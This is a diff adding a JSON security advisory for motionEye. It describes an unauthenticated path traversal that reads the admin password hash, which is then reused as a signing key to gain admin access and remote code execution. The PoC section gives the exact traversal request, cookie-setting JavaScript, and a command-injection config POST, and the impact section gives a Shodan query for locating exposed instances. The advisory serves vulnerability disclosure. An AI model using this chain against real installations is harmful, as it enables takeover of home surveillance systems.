@@ -1,0 +1,109 @@
+{
+  "id": "GHSA-phv5-334h-mxcw",
+  "modified": "2026-06-23T19:15:08.303912395Z",
+  "published": "2026-06-23T19:09:29Z",
+  "summary": "motionEye Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal",
+  "details": "# Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal\n\n### Summary\n\nMyself and others have reported several RCE vulnerabilities to this project. However, due to the nature of the app, these are largely not of all that much value, as there is built-in functionality to run commands upon certain actions — i.e. RCE is by design.\n\nWith that in mind, I endeavored to find some sort of auth bypass, and was slightly successful.\n\nWhen the admin password is set but the normal (surveillance) user password is left empty (the default), an unauthenticated attacker can exploit a path traversal vulnerability to read the motionEye configuration file from disk. This file contains the admin password as a SHA-1 hash, and that hash is accepted directly as a signing key for admin API requests — no cracking required. The result is full admin access from zero credentials.\n\nThis is a realistic scenario: many installations set an admin password to protect the settings UI but leave the normal user password empty so household members can view camera feeds without logging in.\n\n### Details\n\nThe vulnerability chains two independent issues:\n\n**1. Unauthenticated normal-user access when `@normal_password` is empty**\n\nIn `motioneye/handlers/base.py`, lines 149-151:\n\n```python\n# no authentication required for normal user\nif not username and not normal_password:\n    return 'normal'\n```\n\nWhen `@normal_password` is empty (the default — see `config.py` line 2251: `data.setdefault('@normal_password', '')`), any request without a `_username` parameter is silently granted `normal` user access. This is by design for convenience, but it means all normal-level endpoints are fully unauthenticated.\n\n**2. Path traversal in `MoviePlaybackHandler` (and related handlers)**\n\nThe movie playback handler at `motioneye/handlers/movie_playback.py` serves recorded video files. It accepts a filename in the URL path:\n\n```\nGET /movie/\u003ccamera_id\u003e/playback/\u003cfilename\u003e\n```\n\nThe filename is passed to `mediafiles.get_media_path()` (`mediafiles.py` lines 497-500):\n\n```python\ndef get_media_path(camera_config, path, media_type):\n    target_dir = camera_config.get('target_dir')\n    full_path = os.path.join(target_dir, path)\n    return full_path\n```\n\nWhen `path` is an absolute path (e.g. `/etc/motioneye/motion.conf`), Python's `os.path.join()` discards `target_dir` entirely and returns the absolute path as-is. This would normally be caught by Tornado's `StaticFileHandler` path validation, but `MoviePlaybackHandler` explicitly overrides both safety checks (`movie_playback.py` lines 111-115):\n\n```python\ndef get_absolute_path(self, root, path):\n    return path\n\ndef validate_absolute_path(self, root, absolute_path):\n    return absolute_path\n```\n\nThis allows reading any file on the filesystem that the motionEye process can access.\n\nThe same path traversal exists in the movie download, picture download, and picture preview handlers:\n\n- `GET /movie/\u003ccamera_id\u003e/download/\u003cfilename\u003e`\n- `GET /picture/\u003ccamera_id\u003e/download/\u003cfilename\u003e`\n- `GET /picture/\u003ccamera_id\u003e/preview/\u003cfilename\u003e`\n\n**3. Admin hash stored in a readable config file and accepted directly as a signing key**\n\nmotionEye stores the admin password as `SHA1(plaintext)` in its main configuration file (`motion.conf`), written as a comment line:\n\n```\n# @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db\n```\n\nThe authentication code in `base.py` (lines 137-147) accepts signatures computed with **either** the raw stored hash or `SHA1(stored_hash)` as the signing key:\n\n```python\nif username == admin_username and (\n    signature == utils.compute_signature(\n        self.request.method, self.request.uri, self.request.body, admin_password\n    )\n    or signature == utils.compute_signature(\n        self.request.method, self.request.uri, self.request.body, admin_hash\n    )\n):\n    return 'admin'\n```\n\nHere `admin_password` is the raw value from the config file (the SHA-1 hash), and `admin_hash` is `SHA1(admin_password)` — a hash of the hash. Since the stored value is already a SHA-1 hash, and it is accepted directly as a valid signing key, there is no need to crack it. The attacker can use the stolen hash immediately.\n\nFurthermore, the client-side JavaScript (`static/js/main.js` line 3631) computes `sha1(plaintext_password)` and stores it in the `meye_password_hash` cookie as the signing key. This is the same value as `@admin_password` in the config file.\n\n### PoC\n\n**Step 1** — Read the config file (unauthenticated, requires empty normal password):\n\n```\nGET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1\nHost: target:8765\n```\n\nResponse contains:\n\n```\n# @admin_username admin\n# @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db\n```\n\n**Step 2** — Use the hash to become admin. In the browser console:\n\n```javascript\ndocument.cookie = \"meye_username=admin; path=/\";\ndocument.cookie = \"meye_password_hash=7b7d55439abccf4ae83047c1af2707e6eb6664db; path=/\";\nlocation.reload();\n```\n\nThe page reloads with full admin access. All subsequent requests are signed with the stolen hash.\n\n**Step 3 (optional)** — Achieve RCE via the admin config API. The admin can set `command_notifications_exec` or `command_storage_exec` to arbitrary shell commands, which are written into motion event hooks and executed by the motion daemon:\n\n```\nPOST /config/1/set HTTP/1.1\nContent-Type: application/json\n\n{\"command_notifications_enabled\": true, \"command_notifications_exec\": \"touch /tmp/pwned\", ...}\n```\n\n### Impact\n\n- **Privilege escalation from zero credentials to full admin** on any installation where the admin password is set but the normal user password is left empty (the default configuration).\n- **Arbitrary file read** of any file readable by the motionEye process (typically running as `motion` user, or `root` on motionEyeOS). This includes `/etc/passwd`, `/etc/shadow` (if permissions allow), SSH keys, and application secrets.\n- **Full remote code execution** — once admin access is obtained, the attacker can inject arbitrary shell commands via motion event hooks (`command_notifications_exec`, `command_storage_exec`, or `web_hook_storage_url`). Commands execute as the motion daemon user.\n- **Realistic attack surface** — this is a common configuration for home surveillance setups where the admin password protects settings but camera feeds are left open for household members. Public instances are discoverable via Shodan (`http.favicon.hash:1898775751`).\n\n### Suggested Fix\n\n1. The path traversal should be fixed by validating that the resolved path stays within the camera's `target_dir`. Do not override `get_absolute_path` and `validate_absolute_path` to bypass Tornado's built-in protections. At minimum, reject absolute paths in the filename parameter.\n2. Consider warning users in the UI when the normal user password is empty, as this makes all normal-level endpoints (including the vulnerable file handlers) fully unauthenticated.\n3. The admin password hash should not be stored in a file that is served by the same file handlers used for media content. Alternatively, the `@` metadata lines should be moved to a separate configuration file that is not within any camera's media path.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "motioneye",
+        "purl": "pkg:pypi/motioneye"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.44.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.27",
+        "0.27.1",
+        "0.27.2",
+        "0.28",
+        "0.28.1",
+        "0.28.2",
+        "0.28.3",
+        "0.29",
+        "0.29.1",
+        "0.29rc1",
+        "0.29rc2",
+        "0.30",
+        "0.30rc1",
+        "0.30rc2",
+        "0.31",
+        "0.31.1",
+        "0.31.2",
+        "0.31.3",
+        "0.31.4",
+        "0.31.5",
+        "0.32",
+        "0.32.1",
+        "0.32.2",
+        "0.33",
+        "0.33.1",
+        "0.33.2",
+        "0.33.3",
+        "0.33.4",
+        "0.34",
+        "0.34.1",
+        "0.34rc1",
+        "0.35",
+        "0.35.1",
+        "0.35.2",
+        "0.35rc1",
+        "0.36",
+        "0.36.1",
+        "0.37",
+        "0.37.1",
+        "0.37rc1",
+        "0.38",
+        "0.38.1",
+        "0.39",
+        "0.39.1",
+        "0.39.2",
+        "0.39.3",
+        "0.40",
+        "0.40rc1",
+        "0.40rc2",
+        "0.40rc3",
+        "0.40rc4",
+        "0.40rc5",
+        "0.41",
+        "0.41rc1",
+        "0.42",
+        "0.42.1",
+        "0.43.1",
+        "0.43.1b1",
+        "0.43.1b2",
+        "0.43.1b3",
+        "0.43.1b4",
+        "0.43.1b5",
+        "0.44.0b1",
+        "0.44.0b2",
+        "0.44.0b3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-phv5-334h-mxcw/GHSA-phv5-334h-mxcw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/motioneye-project/motioneye/security/advisories/GHSA-phv5-334h-mxcw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/motioneye-project/motioneye"
+    }
+  ]
+}
